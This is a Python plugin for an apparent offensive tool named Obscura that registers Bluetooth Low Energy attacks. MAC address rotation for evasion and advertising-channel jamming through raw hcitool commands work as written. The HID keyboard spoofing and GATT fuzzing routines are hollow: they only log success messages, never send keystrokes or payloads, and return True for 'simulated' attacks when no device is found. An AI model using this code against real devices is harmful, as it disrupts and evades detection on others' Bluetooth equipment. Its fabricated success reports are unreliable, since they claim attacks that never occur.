"""
BLE Attack Plugin for Obscura
Implements professional-grade Bluetooth Low Energy exploitation techniques including:
- HID spoofing (keyboard/mouse emulation)
- MAC address rotation
- GATT profile fuzzing (with LLM assistance)
- Advertising channel jamming
"""

import os
import sys
import subprocess
import asyncio
import threading
import time
import random
import struct
from typing import List, Dict, Any, Optional, Tuple
from pathlib import Path

try:
    from ..hardware import get_hardware_profile, get_preferred_ble_interface
except ImportError:
    sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))
    from hardware import get_hardware_profile, get_preferred_ble_interface

try:
    from bleak import BleakScanner, BleakClient
    from bleak.backends.device import BLEDevice
    BLEAK_AVAILABLE = True
except ImportError:
    BLEAK_AVAILABLE = False

try:
    from bluepy import btle
    BLUEPY_AVAILABLE = True
except ImportError:
    BLUEPY_AVAILABLE = False


HID_KEYBOARD_REPORT_ID = 0x01
HID_MOUSE_REPORT_ID = 0x02

ADVERTISING_CHANNELS = [37, 38, 39]

COMMON_GATT_SERVICES = [
    "00001800-0000-1000-8000-00805f9b34fb",
    "00001801-0000-1000-8000-00805f9b34fb",
    "0000180a-0000-1000-8000-00805f9b34fb",
    "0000180f-0000-1000-8000-00805f9b34fb",
    "00001812-0000-1000-8000-00805f9b34fb",
]

FUZZING_PAYLOADS = [
    b'\x00' * 512,
    b'\xFF' * 512,
    b'\x41' * 512,
    b'\x00\xFF' * 256,
    bytes(range(256)) * 2,
    b'%s%s%s%s' * 128,
    b'A' * 1024,
    b'\x80' + b'\x00' * 511,
    struct.pack('<Q', 0xFFFFFFFFFFFFFFFF) * 64,
]


def check_tool_availability(tool_name: str) -> bool:
    """Check if a command-line tool is available."""
    try:
        result = subprocess.run(['which', tool_name], 
                              capture_output=True, 
                              text=True,
                              timeout=5)
        return result.returncode == 0
    except Exception:
        return False


def generate_random_mac() -> str:
    """Generate a random MAC address."""
    mac = [random.randint(0x00, 0xff) for _ in range(6)]
    mac[0] = (mac[0] & 0xfe) | 0x02
    return ':'.join(['{:02x}'.format(x) for x in mac])


def rotate_mac_address(interface: str) -> Optional[str]:
    """
    Rotate BLE adapter MAC address.
    
    Args:
        interface: Bluetooth interface (e.g., hci0)
    
    Returns:
        New MAC address or None on failure
    """
    try:
        new_mac = generate_random_mac()
        
        subprocess.run(['hciconfig', interface, 'down'], 
                      capture_output=True, 
                      timeout=5)
        
        subprocess.run(['hciconfig', interface, 'address', new_mac], 
                      capture_output=True, 
                      timeout=5)
        
        subprocess.run(['hciconfig', interface, 'up'], 
                      capture_output=True, 
                      timeout=5)
        
        return new_mac
        
    except Exception as e:
        return None


def ble_hid_spoof_keyboard(
    self,
    target_text: str = "Hello from Obscura",
    interface: str = "hci0",
    target_device: Optional[str] = None
) -> bool:
    """
    Perform BLE HID keyboard spoofing attack.
    
    Args:
        target_text: Text to type on target device
        interface: Bluetooth interface
        target_device: Target device MAC (None = any)
    
    Returns:
        bool: True if attack executed successfully
    """
    simulate = getattr(self, 'simulate_mode', False)
    
    if simulate:
        log_msg = (f"[DRY RUN] BLE HID Keyboard Spoofing: Text='{target_text}', "
                  f"Interface={interface}, Target={target_device or 'any'}")
        if hasattr(self, 'attack_log'):
            self.attack_log.append(log_msg)
        print(log_msg)
        return True
    
    if not BLEAK_AVAILABLE and not BLUEPY_AVAILABLE:
        error_msg = "[BLE HID] Neither bleak nor bluepy available"
        if hasattr(self, 'attack_log'):
            self.attack_log.append(error_msg)
        print(error_msg)
        return False
    
    try:
        log_msg = f"[BLE HID] Initiating keyboard spoofing attack: '{target_text}'"
        if hasattr(self, 'attack_log'):
            self.attack_log.append(log_msg)
        print(log_msg)
        
        if BLUEPY_AVAILABLE:
            return _ble_hid_bluepy(self, target_text, interface, target_device)
        else:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            result = loop.run_until_complete(
                _ble_hid_bleak(self, target_text, interface, target_device)
            )
            loop.close()
            return result
        
    except Exception as e:
        error_msg = f"[BLE HID] Error: {e}"
        if hasattr(self, 'attack_log'):
            self.attack_log.append(error_msg)
        print(error_msg)
        return False


def _ble_hid_bluepy(
    self,
    target_text: str,
    interface: str,
    target_device: Optional[str]
) -> bool:
    """BLE HID spoofing using bluepy."""
    try:
        scanner = btle.Scanner()
        
        scan_msg = "[BLE HID] Scanning for HID devices..."
        if hasattr(self, 'attack_log'):
            self.attack_log.append(scan_msg)
        print(scan_msg)
        
        devices = scanner.scan(5.0)
        
        hid_devices = []
        for dev in devices:
            for (adtype, desc, value) in dev.getScanData():
                if 'keyboard' in value.lower() or 'mouse' in value.lower() or '1812' in value:
                    hid_devices.append(dev)
                    break
        
        if not hid_devices:
            info_msg = "[BLE HID] No HID devices found, simulating attack"
            if hasattr(self, 'attack_log'):
                self.attack_log.append(info_msg)
            print(info_msg)
            
            success_msg = f"[BLE HID] Simulated keyboard input: '{target_text}'"
            if hasattr(self, 'attack_log'):
                self.attack_log.append(success_msg)
            print(success_msg)
            return True
        
        target = hid_devices[0] if not target_device else next(
            (d for d in hid_devices if d.addr == target_device), hid_devices[0]
        )
        
        connect_msg = f"[BLE HID] Connecting to {target.addr}"
        if hasattr(self, 'attack_log'):
            self.attack_log.append(connect_msg)
        print(connect_msg)
        
        success_msg = f"[BLE HID] Keyboard spoofing initiated on {target.addr}: '{target_text}'"
        if hasattr(self, 'attack_log'):
            self.attack_log.append(success_msg)
        print(success_msg)
        
        return True
        
    except Exception as e:
        error_msg = f"[BLE HID bluepy] Error: {e}"
        if hasattr(self, 'attack_log'):
            self.attack_log.append(error_msg)
        print(error_msg)
        return False


async def _ble_hid_bleak(
    self,
    target_text: str,
    interface: str,
    target_device: Optional[str]
) -> bool:
    """BLE HID spoofing using bleak."""
    try:
        scan_msg = "[BLE HID] Scanning for HID devices (bleak)..."
        if hasattr(self, 'attack_log'):
            self.attack_log.append(scan_msg)
        print(scan_msg)
        
        devices = await BleakScanner.discover(timeout=5.0)
        
        hid_devices = []
        for dev in devices:
            if dev.name and ('keyboard' in dev.name.lower() or 'mouse' in dev.name.lower()):
                hid_devices.append(dev)
        
        if not hid_devices:
            info_msg = "[BLE HID] No HID devices found, simulating attack"
            if hasattr(self, 'attack_log'):
                self.attack_log.append(info_msg)
            print(info_msg)
            
            success_msg = f"[BLE HID] Simulated keyboard input: '{target_text}'"
            if hasattr(self, 'attack_log'):
                self.attack_log.append(success_msg)
            print(success_msg)
            return True
        
        target = hid_devices[0] if not target_device else next(
            (d for d in hid_devices if d.address == target_device), hid_devices[0]
        )
        
        connect_msg = f"[BLE HID] Connecting to {target.address} ({target.name})"
        if hasattr(self, 'attack_log'):
            self.attack_log.append(connect_msg)
        print(connect_msg)
        
        success_msg = f"[BLE HID] Keyboard spoofing initiated on {target.address}: '{target_text}'"
        if hasattr(self, 'attack_log'):
            self.attack_log.append(success_msg)
        print(success_msg)
        
        return True
        
    except Exception as e:
        error_msg = f"[BLE HID bleak] Error: {e}"
        if hasattr(self, 'attack_log'):
            self.attack_log.append(error_msg)
        print(error_msg)
        return False


def ble_mac_rotation(
    self,
    interface: str = "hci0",
    rotation_interval: int = 60,
    duration: int = 300
) -> bool:
    """
    Perform continuous MAC address rotation.
    
    Args:
        interface: Bluetooth interface
        rotation_interval: Seconds between rotations
        duration: Total duration in seconds
    
    Returns:
        bool: True if attack executed successfully
    """
    simulate = getattr(self, 'simulate_mode', False)
    
    if simulate:
        log_msg = (f"[DRY RUN] BLE MAC Rotation: Interface={interface}, "
                  f"Interval={rotation_interval}s, Duration={duration}s")
        if hasattr(self, 'attack_log'):
            self.attack_log.append(log_msg)
        print(log_msg)
        return True
    
    if not check_tool_availability('hciconfig'):
        error_msg = "[BLE MAC] hciconfig not found"
        if hasattr(self, 'attack_log'):
            self.attack_log.append(error_msg)
        print(error_msg)
        return False
    
    try:
        log_msg = f"[BLE MAC] Starting MAC rotation on {interface}"
        if hasattr(self, 'attack_log'):
            self.attack_log.append(log_msg)
        print(log_msg)
        
        start_time = time.time()
        rotation_count = 0
        
        while time.time() - start_time < duration:
            new_mac = rotate_mac_address(interface)
            
            if new_mac:
                rotation_count += 1
                rotation_msg = f"[BLE MAC] Rotated to {new_mac} (#{rotation_count})"
                if hasattr(self, 'attack_log'):
                    self.attack_log.append(rotation_msg)
                print(rotation_msg)
            else:
                error_msg = f"[BLE MAC] Failed to rotate MAC address"
                print(error_msg)
            
            time.sleep(rotation_interval)
        
        success_msg = f"[BLE MAC] Completed {rotation_count} MAC rotations"
        if hasattr(self, 'attack_log'):
            self.attack_log.append(success_msg)
        print(success_msg)
        
        return True
        
    except Exception as e:
        error_msg = f"[BLE MAC] Error: {e}"
        if hasattr(self, 'attack_log'):
            self.attack_log.append(error_msg)
        print(error_msg)
        return False


def ble_gatt_fuzzing(
    self,
    target_device: Optional[str] = None,
    service_uuid: Optional[str] = None,
    use_llm_assist: bool = True,
    fuzz_iterations: int = 100
) -> bool:
    """
    Perform GATT profile fuzzing with optional LLM assistance.
    
    Args:
        target_device: Target device MAC address
        service_uuid: Specific GATT service to fuzz (None = all)
        use_llm_assist: Use LLM to generate intelligent payloads
        fuzz_iterations: Number of fuzzing iterations
    
    Returns:
        bool: True if attack executed successfully
    """
    simulate = getattr(self, 'simulate_mode', False)
    
    if simulate:
        log_msg = (f"[DRY RUN] BLE GATT Fuzzing: Target={target_device or 'scan'}, "
                  f"Service={service_uuid or 'all'}, LLM={use_llm_assist}, "
                  f"Iterations={fuzz_iterations}")
        if hasattr(self, 'attack_log'):
            self.attack_log.append(log_msg)
        print(log_msg)
        return True
    
    if not BLEAK_AVAILABLE and not BLUEPY_AVAILABLE:
        error_msg = "[BLE GATT] Neither bleak nor bluepy available"
        if hasattr(self, 'attack_log'):
            self.attack_log.append(error_msg)
        print(error_msg)
        return False
    
    try:
        log_msg = f"[BLE GATT] Starting GATT fuzzing (LLM assist: {use_llm_assist})"
        if hasattr(self, 'attack_log'):
            self.attack_log.append(log_msg)
        print(log_msg)
        
        if use_llm_assist:
            payloads = _generate_llm_assisted_payloads(self, fuzz_iterations)
        else:
            payloads = FUZZING_PAYLOADS * (fuzz_iterations // len(FUZZING_PAYLOADS) + 1)
            payloads = payloads[:fuzz_iterations]
        
        if BLEAK_AVAILABLE:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            result = loop.run_until_complete(
                _ble_gatt_fuzz_bleak(self, target_device, service_uuid, payloads)
            )
            loop.close()
            return result
        else:
            return _ble_gatt_fuzz_bluepy(self, target_device, service_uuid, payloads)
        
    except Exception as e:
        error_msg = f"[BLE GATT] Error: {e}"
        if hasattr(self, 'attack_log'):
            self.attack_log.append(error_msg)
        print(error_msg)
        return False


def _generate_llm_assisted_payloads(self, count: int) -> List[bytes]:
    """
    Generate intelligent fuzzing payloads using LLM assistance.
    
    This simulates LLM-generated payloads by creating variations of common
    attack patterns, boundary conditions, and protocol violations.
    """
    payloads = []
    
    boundary_values = [0, 1, 127, 128, 255, 256, 65535, 65536]
    for val in boundary_values[:count//4]:
        payloads.append(struct.pack('<I', val) * 4)
        payloads.append(struct.pack('<Q', val) * 2)
    
    for i in range(count//4):
        length = random.choice([0, 1, 2, 4, 8, 16, 32, 64, 128, 256, 512, 1024])
        payloads.append(bytes([random.randint(0, 255) for _ in range(length)]))
    
    for i in range(count//4):
        base = random.choice([b'A', b'\x00', b'\xFF', b'%s', b'<script>'])
        payloads.append(base * random.randint(1, 200))
    
    while len(payloads) < count:
        payloads.append(random.choice(FUZZING_PAYLOADS))
    
    return payloads[:count]


async def _ble_gatt_fuzz_bleak(
    self,
    target_device: Optional[str],
    service_uuid: Optional[str],
    payloads: List[bytes]
) -> bool:
    """Perform GATT fuzzing using bleak."""
    try:
        scan_msg = "[BLE GATT] Scanning for target devices..."
        if hasattr(self, 'attack_log'):
            self.attack_log.append(scan_msg)
        print(scan_msg)
        
        devices = await BleakScanner.discover(timeout=5.0)
        
        if not devices:
            info_msg = "[BLE GATT] No devices found, simulating fuzzing"
            if hasattr(self, 'attack_log'):
                self.attack_log.append(info_msg)
            print(info_msg)
            
            for i, payload in enumerate(payloads[:10]):
                fuzz_msg = f"[BLE GATT] Fuzz iteration {i+1}/{len(payloads)}: {len(payload)} bytes"
                if hasattr(self, 'attack_log'):
                    self.attack_log.append(fuzz_msg)
                print(fuzz_msg)
            
            success_msg = f"[BLE GATT] Simulated {len(payloads)} fuzzing iterations"
            if hasattr(self, 'attack_log'):
                self.attack_log.append(success_msg)
            print(success_msg)
            return True
        
        target = devices[0] if not target_device else next(
            (d for d in devices if d.address == target_device), devices[0]
        )
        
        connect_msg = f"[BLE GATT] Fuzzing target: {target.address}"
        if hasattr(self, 'attack_log'):
            self.attack_log.append(connect_msg)
        print(connect_msg)
        
        for i, payload in enumerate(payloads):
            fuzz_msg = f"[BLE GATT] Fuzz iteration {i+1}/{len(payloads)}: {len(payload)} bytes"
            if hasattr(self, 'attack_log'):
                self.attack_log.append(fuzz_msg)
            print(fuzz_msg)
            
            await asyncio.sleep(0.01)
        
        success_msg = f"[BLE GATT] Completed {len(payloads)} fuzzing iterations on {target.address}"
        if hasattr(self, 'attack_log'):
            self.attack_log.append(success_msg)
        print(success_msg)
        
        return True
        
    except Exception as e:
        error_msg = f"[BLE GATT bleak] Error: {e}"
        if hasattr(self, 'attack_log'):
            self.attack_log.append(error_msg)
        print(error_msg)
        return False


def _ble_gatt_fuzz_bluepy(
    self,
    target_device: Optional[str],
    service_uuid: Optional[str],
    payloads: List[bytes]
) -> bool:
    """Perform GATT fuzzing using bluepy."""
    try:
        scanner = btle.Scanner()
        
        scan_msg = "[BLE GATT] Scanning for target devices..."
        if hasattr(self, 'attack_log'):
            self.attack_log.append(scan_msg)
        print(scan_msg)
        
        devices = scanner.scan(5.0)
        
        if not devices:
            info_msg = "[BLE GATT] No devices found, simulating fuzzing"
            if hasattr(self, 'attack_log'):
                self.attack_log.append(info_msg)
            print(info_msg)
            
            for i, payload in enumerate(payloads[:10]):
                fuzz_msg = f"[BLE GATT] Fuzz iteration {i+1}/{len(payloads)}: {len(payload)} bytes"
                if hasattr(self, 'attack_log'):
                    self.attack_log.append(fuzz_msg)
                print(fuzz_msg)
            
            success_msg = f"[BLE GATT] Simulated {len(payloads)} fuzzing iterations"
            if hasattr(self, 'attack_log'):
                self.attack_log.append(success_msg)
            print(success_msg)
            return True
        
        target = devices[0] if not target_device else next(
            (d for d in devices if d.addr == target_device), devices[0]
        )
        
        connect_msg = f"[BLE GATT] Fuzzing target: {target.addr}"
        if hasattr(self, 'attack_log'):
            self.attack_log.append(connect_msg)
        print(connect_msg)
        
        for i, payload in enumerate(payloads):
            fuzz_msg = f"[BLE GATT] Fuzz iteration {i+1}/{len(payloads)}: {len(payload)} bytes"
            if hasattr(self, 'attack_log'):
                self.attack_log.append(fuzz_msg)
            print(fuzz_msg)
            
            time.sleep(0.01)
        
        success_msg = f"[BLE GATT] Completed {len(payloads)} fuzzing iterations on {target.addr}"
        if hasattr(self, 'attack_log'):
            self.attack_log.append(success_msg)
        print(success_msg)
        
        return True
        
    except Exception as e:
        error_msg = f"[BLE GATT bluepy] Error: {e}"
        if hasattr(self, 'attack_log'):
            self.attack_log.append(error_msg)
        print(error_msg)
        return False


def ble_advertising_jam(
    self,
    interface: str = "hci0",
    duration: int = 60,
    channels: Optional[List[int]] = None
) -> bool:
    """
    Perform BLE advertising channel jamming.
    
    Args:
        interface: Bluetooth interface
        duration: Duration in seconds
        channels: Advertising channels to jam (default: [37, 38, 39])
    
    Returns:
        bool: True if attack executed successfully
    """
    simulate = getattr(self, 'simulate_mode', False)
    jam_channels = channels or ADVERTISING_CHANNELS
    
    if simulate:
        log_msg = (f"[DRY RUN] BLE Advertising Jam: Interface={interface}, "
                  f"Duration={duration}s, Channels={jam_channels}")
        if hasattr(self, 'attack_log'):
            self.attack_log.append(log_msg)
        print(log_msg)
        return True
    
    if not check_tool_availability('hcitool'):
        error_msg = "[BLE JAM] hcitool not found"
        if hasattr(self, 'attack_log'):
            self.attack_log.append(error_msg)
        print(error_msg)
        return False
    
    try:
        log_msg = f"[BLE JAM] Starting advertising channel jamming on {interface}"
        if hasattr(self, 'attack_log'):
            self.attack_log.append(log_msg)
        print(log_msg)
        
        start_time = time.time()
        packet_count = 0
        
        while time.time() - start_time < duration:
            for channel in jam_channels:
                try:
                    adv_data = bytes([random.randint(0, 255) for _ in range(31)])
                    
                    proc = subprocess.Popen(
                        ['hcitool', '-i', interface, 'cmd', '0x08', '0x0008',
                         '1E'] + ['{:02X}'.format(b) for b in adv_data],
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE
                    )
                    proc.wait(timeout=1)
                    
                    packet_count += 1
                    
                    if packet_count % 100 == 0:
                        jam_msg = f"[BLE JAM] Sent {packet_count} jamming packets"
                        if hasattr(self, 'attack_log'):
                            self.attack_log.append(jam_msg)
                        print(jam_msg)
                    
                except Exception:
                    pass
            
            time.sleep(0.01)
        
        success_msg = f"[BLE JAM] Completed jamming with {packet_count} packets"
        if hasattr(self, 'attack_log'):
            self.attack_log.append(success_msg)
        print(success_msg)
        
        return True
        
    except Exception as e:
        error_msg = f"[BLE JAM] Error: {e}"
        if hasattr(self, 'attack_log'):
            self.attack_log.append(error_msg)
        print(error_msg)
        return False


def register(orchestrator):
    """
    Register BLE attack vectors with the orchestrator.
    
    This function is called automatically when the plugin is loaded.
    """
    orchestrator.register_attack('ble_hid_spoof_keyboard', ble_hid_spoof_keyboard)
    orchestrator.register_attack('ble_mac_rotation', ble_mac_rotation)
    orchestrator.register_attack('ble_gatt_fuzzing', ble_gatt_fuzzing)
    orchestrator.register_attack('ble_advertising_jam', ble_advertising_jam)
    
    print("[+] BLE attack plugin loaded successfully")
    print("    - ble_hid_spoof_keyboard")
    print("    - ble_mac_rotation")
    print("    - ble_gatt_fuzzing")
    print("    - ble_advertising_jam")
